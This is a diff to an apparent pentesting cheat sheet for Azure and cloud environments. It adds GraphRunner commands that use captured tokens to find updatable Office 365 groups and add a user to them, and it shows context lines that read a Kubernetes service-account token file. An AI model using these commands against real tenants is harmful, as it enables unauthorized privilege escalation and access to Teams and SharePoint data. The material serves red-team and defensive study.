@@ -25,6 +25,8 @@
   * [Azure Container Registry dump](#Azure-Container-Registry-dump)
   * [Azure ARC](#Azure-ARC)
   * [Kubernetes](#Kubernetes)
+* [Office 365](#Office-365)
+  * [Updateable groups](#Updateable-groups)
 
 ## General
 ### Requesting access tokens
@@ -701,3 +703,20 @@ cat /var/run/secrets/kubernetes.io/serviceaccount/token
 ```
 ./kubectl describe pods
 ```
+
+## Office 365
+### Updateable groups
+- https://github.com/dafthack/GraphRunner
+
+#### Check for updateable groups
+```
+Get-UpdatableGroups -Tokens $tokens
+```
+
+#### Add to interesting group
+```
+Invoke-AddGroupMember -Tokens $tokens -GroupId <ID> -userId <USERID>
+```
+
+#### Check for access of group
+- Browse through the Teams channel and SharePoint files for interesting data!
